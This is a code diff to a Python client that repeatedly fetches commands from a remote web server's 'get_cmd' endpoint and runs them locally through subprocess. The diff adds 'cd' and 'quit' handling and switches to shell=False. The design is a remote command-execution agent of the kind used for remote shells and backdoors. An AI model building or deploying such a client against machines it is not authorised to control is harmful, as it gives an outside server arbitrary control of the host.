@@ -6,6 +6,7 @@ import queue
 import threading
 from urllib.parse import urljoin
 import signal
+import os
 
 
 R = queue.Queue()
@@ -32,6 +33,16 @@ def web_comm_send():
             time.sleep(0.2)
 
 
+def shell_command(com: str):
+    d = com.split(maxsplit=2)
+    if d[0] == 'cd':
+        os.chdir(d[1])
+        return True
+    if d[0] == 'quit':
+        raise KeyboardInterrupt
+    return False
+
+
 def work():
     global stop_web_comm
     try:
@@ -44,12 +55,12 @@ def work():
             stop_web_comm = False
             cmd = requests.get(urljoin(url_base, "get_cmd")).json()
             cmdid, cmdexec = cmd['uuid'], cmd['exec']
-            if cmdexec == 'quit':
-                raise KeyboardInterrupt
+            if shell_command(cmdexec):
+                continue
             try:
                 fil = open("tmp.log", "w", 1)
                 proc = subprocess.Popen(
-                    cmdexec, shell=True, universal_newlines=True, bufsize=0,
+                    cmdexec, shell=False, universal_newlines=True, bufsize=0,
                     stdin=subprocess.PIPE, stdout=fil, stderr=fil
                 )
                 comm = (
